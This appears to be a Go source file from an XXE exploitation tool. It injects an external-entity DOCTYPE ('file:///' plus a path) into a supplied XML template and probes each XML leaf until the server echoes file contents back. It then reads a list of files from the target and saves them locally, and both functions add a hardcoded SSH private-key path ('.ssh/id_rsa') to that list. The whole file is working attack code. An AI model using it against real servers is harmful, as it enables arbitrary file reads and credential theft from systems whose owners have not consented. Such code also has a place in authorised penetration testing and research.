package xxe

import (
	"bytes"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"regexp"

	str "strings"
)

func DirectTest(url, xmlTemplate, cookie, outDir, fileList string) error {
	fmt.Println("testing...")

	xmlData, err := ioutil.ReadFile(xmlTemplate)
	if err != nil {
		return err
	}

	leafName, err := DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList)
	if err != nil {
		return err
	}

	if leafName == "" {
		return fmt.Errorf("can't find XXE injection")
	}

	files, err := readFileList(fileList)
	if err != nil {
		return err
	}

	files = append(files, "c:/users/daniel/.ssh/id_rsa")

	for _, file := range files {
		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
		entity := fmt.Sprintf(fmtS, file)

		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)

		content, err := getFileContent(url, file, reqXml,
			cookie, outDir, leafName)
		if err != nil {
			return err
		}

		if content != "" {
			locFile := makeLocalPath(outDir, file)
			err = saveFile(locFile, content, false)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList string) (string, error) {
	xmlData, err := ioutil.ReadFile(xmlTemplate)
	if err != nil {
		return "", err
	}

	dec := xml.NewDecoder(bytes.NewBuffer(xmlData))

	var n NodeT
	err = dec.Decode(&n)
	if err != nil {
		return "", err
	}

	var leafs []LeafT
	walkNodes([]NodeT{n}, func(n NodeT) bool {
		decTest := xml.NewDecoder(bytes.NewBuffer(n.Content))
		var nTest NodeT
		err = decTest.Decode(&nTest)
		if err != nil {
			leaf := LeafT{Name: n.XMLName.Local,
				Value: string(n.Content)}
			leafs = append(leafs, leaf)
		}

		return true
	})

	files, err := readFileList(fileList)
	if err != nil {
		return "", err
	}

	files = append(files, "c:/users/daniel/.ssh/id_rsa")

	for _, file := range files {
		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
		entity := fmt.Sprintf(fmtS, file)

		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)

		for _, leaf := range leafs {
			content, err := getFileContent(url, file, reqXml,
				cookie, outDir, leaf.Name)
			if err != nil {
				return "", err
			}

			if content != "" {
				return leaf.Name, nil
			}
		}
	}

	return "", nil
}

func getFileContent(url, file, reqXml, cookie, outDir, leafName string) (string, error) {
	exp := fmt.Sprintf("(<%s>).*(</%s>)", leafName, leafName)
	re := regexp.MustCompile(exp)

	sep := str.Repeat("-=x=", 15) + "-"
	replStr := fmt.Sprintf("${1}\n%s&ext;%s\n${2}", sep, sep)
	reqXmlMod := re.ReplaceAllString(reqXml, replStr)

	body, err := makeRequest(url, reqXmlMod, cookie, outDir)
	if err != nil {
		return "", err
	}
	if str.Contains(body, sep) {
		bodyFields := str.Split(body, sep)
		return bodyFields[1], nil
	}
	return "", nil
}
